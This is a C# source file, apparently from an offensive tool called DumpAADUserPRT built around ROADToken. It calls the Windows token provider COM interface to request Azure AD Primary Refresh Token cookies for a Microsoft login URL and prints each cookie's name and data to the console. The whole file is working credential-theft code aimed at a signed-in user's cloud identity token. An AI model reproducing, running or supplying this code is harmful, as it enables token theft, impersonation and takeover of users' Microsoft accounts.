using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace DumpAADUserPRT
{
    [StructLayout(LayoutKind.Sequential)]
    public class ProofOfPossessionCookieInfo
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public uint Flags { get; set; }
        public string P3PHeader { get; set; }
    }

    public static class ProofOfPossessionCookieInfoManager
    {
        // All these are defined in the Win10 WDK
        [Guid("CDAECE56-4EDF-43DF-B113-88E4556FA1BB")]
        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        internal interface IProofOfPossessionCookieInfoManager
        {
            int GetCookieInfoForUri(
                [MarshalAs(UnmanagedType.LPWStr)] string Uri,
                out uint cookieInfoCount,
                out IntPtr output
            );
        }

        [Guid("A9927F85-A304-4390-8B23-A75F1C668600")]
        [ComImport]
        private class WindowsTokenProvider
        {
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UnsafeProofOfPossessionCookieInfo
        {
            public readonly IntPtr NameStr;
            public readonly IntPtr DataStr;
            public readonly uint Flags;
            public readonly IntPtr P3PHeaderStr;
        }

        public static IEnumerable<ProofOfPossessionCookieInfo> GetCookieInfoForUri(string uri)
        {
            var provider = (IProofOfPossessionCookieInfoManager)new WindowsTokenProvider();
            var res = provider.GetCookieInfoForUri(uri, out uint count, out var ptr);

            if (count <= 0)
                yield break;

            var offset = ptr;
            for (int i = 0; i < count; i++)
            {
                var info = (UnsafeProofOfPossessionCookieInfo)Marshal.PtrToStructure(offset, typeof(UnsafeProofOfPossessionCookieInfo));

                var name = Marshal.PtrToStringUni(info.NameStr);
                var data = Marshal.PtrToStringUni(info.DataStr);
                var flags = info.Flags;
                var p3pHeader = Marshal.PtrToStringUni(info.P3PHeaderStr);


                yield return new ProofOfPossessionCookieInfo()
                {
                    Name = name,
                    Data = data,
                    Flags = flags,
                    P3PHeader = p3pHeader
                };

                Marshal.FreeCoTaskMem(info.NameStr);
                Marshal.FreeCoTaskMem(info.DataStr);
                Marshal.FreeCoTaskMem(info.P3PHeaderStr);

                offset = (IntPtr)(offset.ToInt64() + Marshal.SizeOf(typeof(ProofOfPossessionCookieInfo)));
            }

            Marshal.FreeCoTaskMem(ptr);
        }
    }

    public class SrvChallenge
    {
        public string Nonce { get; set; }
    }
    public class TokenProvider
    {
        public static void GetPRT()
        {
            try
            {
                ROADToken.Program.PrepBody();
                var uris = new[] { "https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=" + ROADToken.Program.nonce };


                foreach (var uri in uris)
                {
                    var cookies = ProofOfPossessionCookieInfoManager.GetCookieInfoForUri(uri);
                    Console.WriteLine("[+] Invoked GetCookieInfoForUri method from COM object");

                    int i = 0;
                    Console.WriteLine("[+] Obtained response:");
                    foreach (var c in cookies)
                    {
                        Console.WriteLine("\tName: " + c.Name);
                        Console.WriteLine("\tData: " + c.Data);
                        i++;
                    }
                    if (i == 0)
                    {
                        Console.WriteLine("[X] Failed to obtain PRT");
                    }

                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[X] Unhandled exception: " + e);
            }
        }
    }
}
